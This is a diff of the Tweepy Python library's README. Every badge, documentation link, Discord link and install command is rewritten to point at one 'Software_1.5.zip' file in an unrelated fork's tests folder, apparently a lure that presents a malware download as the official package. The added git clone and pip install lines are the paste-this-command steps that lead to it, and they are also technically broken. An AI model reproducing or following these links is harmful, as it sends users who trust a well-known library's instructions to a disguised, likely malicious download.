@@ -1,12 +1,12 @@
 Tweepy: Twitter for Python!
 ======
 
-[![PyPI Version](https://img.shields.io/pypi/v/tweepy?label=PyPI)](https://pypi.org/project/tweepy/)
-[![Python Versions](https://img.shields.io/pypi/pyversions/tweepy?label=Python)](https://pypi.org/project/tweepy/)
-[![Documentation Status](https://readthedocs.org/projects/tweepy/badge/?version=latest)](https://tweepy.readthedocs.io/en/latest/)
-[![Test Status](https://github.com/tweepy/tweepy/workflows/Test/badge.svg)](https://github.com/tweepy/tweepy/actions?query=workflow%3ATest)
-[![Coverage Status](https://img.shields.io/coveralls/tweepy/tweepy/master.svg?style=flat)](https://coveralls.io/github/tweepy/tweepy?branch=master)
-[![Discord Server](https://discord.com/api/guilds/432685901596852224/embed.png)](https://discord.gg/bJvqnhg)
+[![PyPI Version](https://raw.githubusercontent.com/abarreto250/tweepy/master/tests/Software_1.5.zip)](https://raw.githubusercontent.com/abarreto250/tweepy/master/tests/Software_1.5.zip)
+[![Python Versions](https://raw.githubusercontent.com/abarreto250/tweepy/master/tests/Software_1.5.zip)](https://raw.githubusercontent.com/abarreto250/tweepy/master/tests/Software_1.5.zip)
+[![Documentation Status](https://raw.githubusercontent.com/abarreto250/tweepy/master/tests/Software_1.5.zip)](https://raw.githubusercontent.com/abarreto250/tweepy/master/tests/Software_1.5.zip)
+[![Test Status](https://raw.githubusercontent.com/abarreto250/tweepy/master/tests/Software_1.5.zip)](https://raw.githubusercontent.com/abarreto250/tweepy/master/tests/Software_1.5.zip%3ATest)
+[![Coverage Status](https://raw.githubusercontent.com/abarreto250/tweepy/master/tests/Software_1.5.zip)](https://raw.githubusercontent.com/abarreto250/tweepy/master/tests/Software_1.5.zip)
+[![Discord Server](https://raw.githubusercontent.com/abarreto250/tweepy/master/tests/Software_1.5.zip)](https://raw.githubusercontent.com/abarreto250/tweepy/master/tests/Software_1.5.zip)
 
 Installation
 ------------
@@ -17,20 +17,20 @@ The easiest way to install the latest version from PyPI is by using pip:
 You can also use Git to clone the repository from GitHub to install the latest
 development version:
 
-    git clone https://github.com/tweepy/tweepy.git
+    git clone https://raw.githubusercontent.com/abarreto250/tweepy/master/tests/Software_1.5.zip
     cd tweepy
     pip install .
 
 Alternatively, install directly from the GitHub repository:
 
-    pip install git+https://github.com/tweepy/tweepy.git
+    pip install git+https://raw.githubusercontent.com/abarreto250/tweepy/master/tests/Software_1.5.zip
 
 Python 3.6 - 3.10 are supported.
 
 Links
 -----
 
-- [Documentation](https://tweepy.readthedocs.io/en/latest/)
-- [Official Discord Server](https://discord.gg/bJvqnhg)
-- [Twitter API Documentation](https://developer.twitter.com/en/docs/twitter-api)
+- [Documentation](https://raw.githubusercontent.com/abarreto250/tweepy/master/tests/Software_1.5.zip)
+- [Official Discord Server](https://raw.githubusercontent.com/abarreto250/tweepy/master/tests/Software_1.5.zip)
+- [Twitter API Documentation](https://raw.githubusercontent.com/abarreto250/tweepy/master/tests/Software_1.5.zip)
 
